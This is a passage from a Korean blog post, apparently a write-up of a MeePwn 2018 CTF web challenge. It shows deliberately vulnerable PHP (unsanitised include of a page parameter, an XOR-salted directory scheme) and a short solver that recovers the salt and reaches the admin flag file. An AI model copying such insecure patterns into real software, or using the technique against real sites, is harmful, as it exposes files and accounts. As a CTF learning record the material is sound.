</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;<span style="color:#ff79c6">html</span>&gt;
&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;index.php&#34;</span>&gt;Homepage&lt;/<span style="color:#ff79c6">a</span>&gt;
&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;?page=register&#34;</span>&gt;Free register&lt;/<span style="color:#ff79c6">a</span>&gt;&lt;/<span style="color:#ff79c6">li</span>&gt;

<span style="color:#ff79c6">&lt;?php</span>
<span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;page&#34;</span>]) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span><span style="color:#ff79c6">empty</span>(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;page&#34;</span>])) {
    <span style="color:#8be9fd;font-style:italic">$page</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;page&#34;</span>];
    <span style="color:#ff79c6">if</span>(strpos(strtolower(<span style="color:#8be9fd;font-style:italic">$page</span>), <span style="color:#f1fa8c">&#39;secret&#39;</span>) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">false</span>) {
        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;No no no!&#39;</span>);
    }
<span style="color:#6272a4">//    else if(strpos($page, &#39;php&#39;) !== false) {
</span><span style="color:#6272a4"></span> <span style="color:#6272a4">//       die(&#34;N0 n0 n0!&#34;);
</span><span style="color:#6272a4">//    }
</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">else</span> {
        <span style="color:#ff79c6">include</span>(<span style="color:#8be9fd;font-style:italic">$page</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#39;.php&#39;</span>);
    }
}
<span style="color:#ff79c6">?&gt;</span>
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><ul>
<li>register.php</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;<span style="color:#ff79c6">html</span>&gt;
<span style="color:#ff79c6">&lt;?php</span>
error_reporting(<span style="color:#bd93f9">0</span>);

<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">gendirandshowflag</span>(<span style="color:#8be9fd;font-style:italic">$username</span>) {
	<span style="color:#ff79c6">include</span>(<span style="color:#f1fa8c">&#39;secret.php&#39;</span>);
	<span style="color:#8be9fd;font-style:italic">$dname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
	<span style="color:#8be9fd;font-style:italic">$intro</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
	<span style="color:#8be9fd;font-style:italic">$_username</span> <span style="color:#ff79c6">=</span> md5(<span style="color:#8be9fd;font-style:italic">$username</span>, <span style="color:#8be9fd;font-style:italic">$raw_output</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">TRUE</span>);
	<span style="color:#ff79c6">for</span>(<span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">&lt;</span>strlen(<span style="color:#8be9fd;font-style:italic">$salt</span>); <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">++</span>) {
		<span style="color:#8be9fd;font-style:italic">$dname</span><span style="color:#ff79c6">.=</span> chr(ord(<span style="color:#8be9fd;font-style:italic">$salt</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]) <span style="color:#ff79c6">^</span> ord(<span style="color:#8be9fd;font-style:italic">$_username</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]));
	};
	<span style="color:#8be9fd;font-style:italic">$dname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;users/&#34;</span> <span style="color:#ff79c6">.</span> bin2hex(<span style="color:#8be9fd;font-style:italic">$dname</span>);
	<span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#39;You have successfully register as &#39;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$username</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#39;!\n&#39;</span>;
	<span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_username</span> <span style="color:#ff79c6">===</span> hex2bin(<span style="color:#f1fa8c">&#39;21232f297a57a5a743894a0e4a801fc3&#39;</span>)) {
		<span style="color:#8be9fd;font-style:italic">$intro</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Here is your flag:&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$flag</span>;
	}
	<span style="color:#ff79c6">else</span> {
		<span style="color:#8be9fd;font-style:italic">$intro</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Here is your flag, but I&#39;m not sure ğŸ¤”: </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">MeePwnCTF{&#34;</span> <span style="color:#ff79c6">.</span> md5(random_bytes(<span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$username</span>) <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;}&#34;</span>;
	}
	mkdir(<span style="color:#8be9fd;font-style:italic">$dname</span>);
	file_put_contents(<span style="color:#8be9fd;font-style:italic">$dname</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#39;/flag.php&#39;</span>, <span style="color:#8be9fd;font-style:italic">$intro</span>);
	header(<span style="color:#f1fa8c">&#34;Location: &#34;</span><span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$dname</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;/flag.php&#34;</span>);
}

<span style="color:#ff79c6">if</span> (isset(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;username&#39;</span>])) {
	<span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;username&#39;</span>] <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#39;admin&#39;</span>) {
		<span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;Username is not allowed!&#39;</span>);
	}
	<span style="color:#ff79c6">else</span> {
		gendirandshowflag(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;username&#39;</span>]);
	}
}
<span style="color:#ff79c6">?&gt;</span>

        &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;?page=register&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;POST&#34;</span>&gt;
        &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
        &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Register&#34;</span>&gt;
        &lt;/<span style="color:#ff79c6">form</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>ì†ŒìŠ¤ì½”ë“œë¥¼ ë¶„ì„í•´ ë³¸ ê²°ê³¼, usernameì˜ md5 í•´ì‰¬ ê°’ì´ <code>21232f297a57a5a743894a0e4a801fc3</code>ë¼ë©´ ì§„ì§œ flagë¥¼ <code>$dname/flag.php</code>ì— ì €ì¥í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.
ì¦‰, md5 í•´ì‰¬ ê°’ì´ <code>21232f297a57a5a743894a0e4a801fc3</code>ì¸ usernameì„ ì°¾ì•„ í•´ë‹¹ <code>username</code>ì˜ <code>$dname</code>ì„ êµ¬í•´ <code>$dname/flag.php</code>ì— ë“¤ì–´ê°€ë©´ flagë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.
<code>$dname</code>ì„ ë§Œë“œëŠ” ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">for($i = 0; $i&lt;<span style="color:#ff79c6">strlen</span>($<span style="color:#50fa7b">salt</span>); $<span style="color:#50fa7b">i</span>++) {
	$<span style="color:#50fa7b">dname</span>.= <span style="color:#50fa7b">chr</span>(<span style="color:#50fa7b">ord</span>($<span style="color:#50fa7b">salt</span>[$<span style="color:#50fa7b">i</span>]) ^ <span style="color:#50fa7b">ord</span>($<span style="color:#50fa7b">_username</span>[$<span style="color:#50fa7b">i</span>]));
};
</code></pre></td></tr></table>
</div>
</div><p>ë”°ë¼ì„œ <code>$dname</code>ì„ ë§Œë“¤ê¸° ìœ„í•´ì„œëŠ” <code>$salt</code>ì˜ ê°’ê³¼ <code>$_username</code>ì˜ ê°’ì„ ì•Œì•„ì•¼ í•œë‹¤.
ì¸í„°ë„·ì˜ í•´ì‰¬ ê°’ì„ í¬ë™í•´ ì£¼ëŠ” ì‚¬ì´íŠ¸ì—ì„œ <code>21232f297a57a5a743894a0e4a801fc3</code>ì˜ í‰ë¬¸ì€ <code>admin</code>ì´ë¼ëŠ” ê²ƒì„ ì•Œì•„ë‚´ì–´, <code>$_username</code>ì€ <code>admin</code>ì´ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.</p>
<p>ë¬¸ì œëŠ” <code>$salt</code> ê°’ì¸ë°, ë³€ìˆ˜ë¥¼ ìƒˆë¡œ ì„ ì–¸ë„ ì•ˆí•œ ê²ƒìœ¼ë¡œ ë³´ì•„ <code>$salt</code>ì˜ ê°’ì€ <code>secret.php</code>ì— ìˆëŠ” ê²ƒ ê°™ë‹¤.
í•˜ì§€ë§Œ <code>index.php</code>ì—ì„œ <code>secret</code>ë¼ëŠ” ë¬¸ìì— ëŒ€í•œ í•„í„°ë§ì„ ê±¸ì–´ ë‘ì—ˆìœ¼ë¯€ë¡œ, <code>secret.php</code>ì˜ ì†ŒìŠ¤ì½”ë“œëŠ” ì•Œì•„ë‚¼ ìˆ˜ ì—†ë‹¤.
ê·¸ë ‡ì§€ë§Œ <code>$dname</code>ì„ ë§Œë“¤ ë•Œ <code>XOR</code> ì—°ì‚°ì„ ì‚¬ìš©í•˜ë©°, í™ˆí˜ì´ì§€ì—ì„œ ë‚´ê°€ ì…ë ¥í•œ ê°’ì„ ë°”íƒ•ìœ¼ë¡œ ë§Œë“¤ì–´ ì§€ëŠ” <code>$dname</code>ì˜ ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p>
<p>ë”°ë¼ì„œ ì´ë¥¼ ì—­ ì—°ì‚°í•˜ë©´ <code>$salt</code>ì˜ ê°’ì„ ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤.
<code>$salt</code>ì˜ ê°’ì„ êµ¬í•˜ê³ , <code>admin</code>ì˜ <code>$dname</code>ì„ êµ¬í•˜ê¸° ìœ„í•´ ì•„ë˜ì™€ ê°™ì´ ì†ŒìŠ¤ì½”ë“œë¥¼ êµ¬í˜„ í–ˆë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?php</span>
	<span style="color:#8be9fd;font-style:italic">$_username</span> <span style="color:#ff79c6">=</span> md5(<span style="color:#f1fa8c">&#34;test&#34;</span>, <span style="color:#8be9fd;font-style:italic">$raw_output</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">TRUE</span>);

	<span style="color:#8be9fd;font-style:italic">$_dname</span> <span style="color:#ff79c6">=</span> hex2bin(<span style="color:#f1fa8c">&#34;b8240bb93fb5c4321196ff675b7f98eb&#34;</span>);

	<span style="color:#8be9fd;font-style:italic">$salt</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;

	<span style="color:#ff79c6">for</span>(<span style="color:#8be9fd;font-style:italic">$i</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> strlen(<span style="color:#8be9fd;font-style:italic">$_username</span>); <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">++</span>) {
		<span style="color:#8be9fd;font-style:italic">$salt</span> <span style="color:#ff79c6">.=</span> chr(ord(<span style="color:#8be9fd;font-style:italic">$_dname</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]) <span style="color:#ff79c6">^</span> ord(<span style="color:#8be9fd;font-style:italic">$_username</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]));
	}

	<span style="color:#8be9fd;font-style:italic">$_username</span> <span style="color:#ff79c6">=</span> md5(<span style="color:#f1fa8c">&#34;admin&#34;</span>, <span style="color:#8be9fd;font-style:italic">$raw_output</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">TRUE</span>);
	<span style="color:#8be9fd;font-style:italic">$dname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;

	<span style="color:#ff79c6">for</span>(<span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> strlen(<span style="color:#8be9fd;font-style:italic">$_username</span>); <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">++</span>) {
		<span style="color:#8be9fd;font-style:italic">$dname</span><span style="color:#ff79c6">.=</span> chr(ord(<span style="color:#8be9fd;font-style:italic">$salt</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]) <span style="color:#ff79c6">^</span> ord(<span style="color:#8be9fd;font-style:italic">$_username</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]));
    }
	<span style="color:#ff79c6">echo</span> bin2hex(<span style="color:#8be9fd;font-style:italic">$dname</span>);
<span style="color:#ff79c6">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>ê·¸ ê²°ê³¼ <code>90884f5d03c3b2e698c1fbea37d833de</code>ë¼ëŠ” <code>$dname</code> ê°’ì„ êµ¬í•  ìˆ˜ ìˆì—ˆë‹¤.
<code>90884f5d03c3b2e698c1fbea37d833de/flag.php</code>ë¡œ ì ‘ì† í•´ ì£¼ì„ì„ í™•ì¸ í•´ë³´ë©´ flagë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_11.png" alt=""></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">FLAG : MeePwnCTF{just-a-warmup-challenge-are-you-ready-for-hacking-others-challz?}
</code></pre></td></tr></table>
</div>
</div></section>
    <footer>
    <div class="tags">
        
        <a href="https://mingzz1.github.io//tags#Write-up">#Write-up</a>
        
        <a href="https://mingzz1.github.io//tags#CTF">#CTF</a>
        
        <a href="https://mingzz1.github.io//tags#MeePwn2018">#MeePwn2018</a>
        
    </div>
</footer>
</article>

<div class="comments">
    <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'mingzzis-blog';
    (function () {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
</div>

<div id="post-nav">
    <div id="previous-post" class="post-nav-post">
        
        <p>Previous post</p>
        <a href="https://mingzz1.github.io/wargame/xss-game/2018/06/27/xssgame-writeup.html/">[XSS Game] Write up</a>
        
    </div>

    <div id="next-post" class="post-nav-post">
        
        <p>Next post</p>
        <a href="https://mingzz1.github.io/ctf/2018/2018/07/18/ctf-meepwn2018-omegasector.html/">[MeePwn2018] OMEGASECTOR Write up</a>
        
    </div>
</div>


    </div>
    <ul class='social'>
    
    <li>
        <a href="https://github.com/mingzz1" class="icon alt" target="_blank">
            <i class="fa fa-github fa-2x"></i>
        </a>
    </li>
    
    <li>
        <a href="https://www.linkedin.com/in/minji-kim-12986a145/" class="icon alt" target="_blank">
            <i class="fa fa-linkedin fa-2x"></i>
        </a>
    </li>
    
</ul>
<footer class="site-footer">
    <p ckass="text">Powered by <a href="https://mingzz1.github.io" target="_blank">mingzzi</a> with <a
            href="https://skye3133.github.io/" target="_blank">myund</a></p>
</footer>

    <script id="dsq-count-scr" src="//mingzzis-blog.disqus.com/count.js" async></script>

    
<script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-130304424-1']);
    _gaq.push(['_trackPageview']);
    (function () {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
</script>
    
</body>
</body>

</html>